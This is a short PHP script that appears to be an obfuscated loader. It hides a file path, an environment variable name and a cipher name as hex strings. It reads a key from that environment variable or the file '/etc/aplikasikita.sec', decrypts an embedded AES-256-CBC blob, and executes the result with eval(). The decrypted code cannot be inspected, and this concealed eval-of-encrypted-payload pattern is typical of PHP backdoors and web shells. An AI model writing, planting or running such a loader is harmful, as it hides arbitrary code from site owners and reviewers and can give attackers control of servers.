<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('TQrGwQxvF6JY9ZcAlal1Uw==');

$c=base64_decode(

'WxQkcks7K/lz4bTUhUPYDhojmpsjSY3SbTzMQkfiPngtq/CxRUC1J7ZZTcacRte43/uw1H0GYntj' .
'MGuZT/FlcFU5uNilvb/NXYb+SKHxLCEFzg5XsTgeiHGlMVFeoCWwzKYB8BGT+WheVfmL1ExXKnS7' .
'RxJ+vrvJ5ujpQVqnDZ8EpakZ1bRW/GCGhZmLy4L7FMF2vtidxVU8bOFUul2QSd9KWqu8f/aoqlQu' .
'b14f3b8yeRWvMCNLp3ZNlsPyFPrAs2ir25II5ljFdCAQnb7cBg+5AETBXP1sym4m/tOQ+6Y4ftnM' .
'nWw9lqvjJ+CDzvjUSMG0BUMUyBUZlOC7SN9qhUBNrwJMacilp7yveFbBcZ9XzUIaJHDDwXMjCNvW' .
'6IpRzMSDYKdZ8ANl+Q3/JsKhA71puxa5DEMQabII9gcVwSh+1qqAEe7QFeSF18IVxA6UhV0vmz1q' .
'2wFnaoVIJ2r3xfQ+EeX3SZmhYBTiUoAxj9TKmvRd3sW0N/wNz10xmnDlLQEaEglKePr+wPPLHMSD' .
'U+i7uCJ97Mwt1rlcFOjohkM='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

